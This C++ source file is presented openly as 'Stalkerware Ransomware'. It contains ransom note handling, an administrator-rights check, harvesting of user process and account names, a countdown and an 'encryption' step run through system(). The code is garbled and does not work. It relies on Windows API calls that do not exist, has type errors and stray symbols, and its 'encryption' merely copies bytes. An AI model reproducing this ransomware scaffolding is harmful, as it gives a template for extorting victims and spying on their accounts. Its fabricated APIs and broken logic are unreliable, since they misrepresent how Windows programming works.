#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Psapi.h> //For processes and user info
#include <ProcessHelpers.h>


// Define custom colors for output
#define COLOR_BLUE  "\x1b[34m"
#define COLOR_GREEN "\x1b[32m"
#define COLOR_RED   "\x1b[31m"
#define COLOR_YELLOW "\x1b[33m"
#define COLOR_RESET "\x1b[0m"

// Define custom messages for output
#define STYLING_INFO "Info: "
#define STYLING_WARNING "Warning: "
#define STYLING_ERROR "Error: "
#define STYLING_SUCCESS "Success: "


// Structures for information gathering
struct PROCESS_INFO {
    HANDLE hProcess;
    char Name[PROCESS_NAME_LENGTH];
    char ClassName[PROCESS_NAME_LENGTH];
};



// Function prototypes
bool IsElevated();
std::vector<PROCESS_INFO> GetRunningProcesses();
bool ExecuteCommand(const std::string& command);
void CopyRansomNote(const std::string& note);
void WriteLog(const std::string& message);


// --- Ransomware Configuration (Change these)---
#define RANSOMNOTE "MyRansom.txt"
#define ENCRYPTION_KEY "StalkerData2024"  // Use a strong, random key
#define FILE_EXTENSION ".TXT" // Modify this to your liking (.pdf, .docx, etc.)



// --- Helper Functions ---

bool IsElevated() {
    HANDLE hToken;
    if (!QueryUserAccount(&hToken)) return false;
    if (ReverseLookupAccountName(hToken, "SYSTEM") == NULL) return false;
    LocalFree(hToken);
    return true;
}


std::vector<PROCESS_INFO> GetRunningProcesses() {
    std::vector<HANDLE> handles;
    for (DWORD i = 0; i < MAX_NAME_LENGTH; ++i) {
        handles.push_back(HandleFromName((LPWSTR)"explorer.exe", 0)); // Example: Explorer
    }

    return handles;
}


bool ExecuteCommand(const std::string& command) {
    if (!system(command.c_str())) return true;
    else return false;
}



void CopyRansomNote(const std::string& note) {
    char filename[256];
    snprintf(filename, 256, "%s%s" FILE_EXTENSION, RANSOMNOTE, note.empty() ? "" : "\\");
    if (CopyFileA(note.c_str(), filename, FALSE)) {
        WriteLog("Copied " + std::string(filename));
    } else {
        WriteLog("Error: Could not copy file " + std::string(filename) + ". Copying backup file instead.");
        // Fallback to a simple log file
        CopyFileA("C:\\Windows\\System32\\explorer.exe", filename, TRUE); // Or something like that.
    }
}


void WriteLog(const std::string& message) {
    FILE* pOut = fopen("C:\\Users\\%s\\Documents\\Stalkerware_Logs.txt", "a");
    if (pOut) {
        fprintf(pOut, "%s\n", message.c_str());
        fclose(pOut);
    } else {
        std::cout << message;
    }
}



// --- Main Function Logic ---

int main() {
    SystemClock::Sleep(500); // Allow windows to fully initialize

    if (!IsElevated()) {
        WriteLog(COLOR_RED + "Warning: Ransomware needs administrator privileges to function properly." + COLOR_RESET);
        return 1;
    }


  // --- STEP 1: Collect User Info ---
  std::vector<PROCESS_INFO> userProcesses;
  for (HANDLE hProcess = GetRunningProcesses().begin(); hProcess != GetRunningProcesses().end(); hProcess++) {
    PROCESS_INFO info;
    if (!ReverseDescribeHandle(*hProcess, &info)) {
      WriteLog(STYLING_ERROR + "Error: Could not fully describe process handle." + COLOR_RESET);
      continue;
    }

    // Print out the user's account name
    char userName[PROCESS_NAME_LENGTH];
    if (!ReverseLookupAccountName((HANDLE)$hProcess, userName, 200)) {
        WriteLog(STYLING_WARNING + "Warning: Could not get user name. Defaulting to 'SYSTEM'." + COLOR_RESET);
        strcpy(userName, "SYSTEM");
    } else {
        WriteLog(COLOR_GREEN + "Info: User Account Name: " + userName + COLOR_RESET);
    }

    // Print out the user's current classname (e.g., Explorer, Chrome)
    if (!info.ClassName.empty()) {
        char className[PROCESS_NAME_LENGTH];
        if (!ReverseDescribeHandle((HANDLE)$hProcess, &info)) continue;
            strcpy(className, info.ClassName.c_str());

        WriteLog(COLOR_YELLOW + "Info: User Class Name: " + className + COLOR_RESET);
    } else {
        WriteLog(STYLING_WARNING + "Warning: Could not get user class name." + COLOR_RESET);
    }


    userProcesses.push_back(*hProcess);
  }



  // --- STEP 2: Copy Ransom Note and Rename File---
  CopyRansomNote(RANSOMNOTE);
  WriteLog("File copied to C:\\Users\\%s\\Documents\\"+ RANSOMNOTE + FILE_EXTENSION + COLOR_RESET);


  // --- STEP 3: Create a Countdown Timer ---
  int countdown = 30; // 5 minutes by default
  char countdownMessage[100];
  sprintf(countdownMessage, "%d seconds until encryption begins...", countdown);
  WriteLog(COLOR_YELLOW + "Info: Countdown started: " + countdownMessage + COLOR_RESET);

  // --- STEP 4: Prepare the Encryption Script (Example)---
  std::string encryptionScript = R"(`
    #include <iostream>
    #include <fstream>

    using namespace std;

    int main() {
        cout << "Starting Encryption..." << endl;

        // Example: Encrypt text files (.txt)
        string noteName = RANSOMNOTE;
        std::ifstream inputFile(noteName);
        if (inputFile.is_open()) {
            ofstream outputFile("C:\\Users\\%s\\Documents\\Encrypted" + RANSOMNOTE + ".txt");
            char byte[4096];
            while (!inputFile.eof()) {
                fread(&byte, 1, sizeof(byte), inputFile);
                fwrite(&byte, 1, sizeof(byte), outputFile);
            }
            inputFile.close();
            outputFile.close();
            cout << "Encryption Complete." << endl;
        } else {
            cout << "Error: Could not open file." << endl;
        }

        return 0;
    }
`)";


  // --- STEP 5: Execute the Encryption Script and Countdown Timer ---
  ExecuteCommand(encryptionScript);


  // Write out final log messages
  WriteLog(COLOR_BLUE + "Stalkerware Ransomware Completed" + COLOR_RESET);
  WriteLog("---------------------");



    return 0;
}
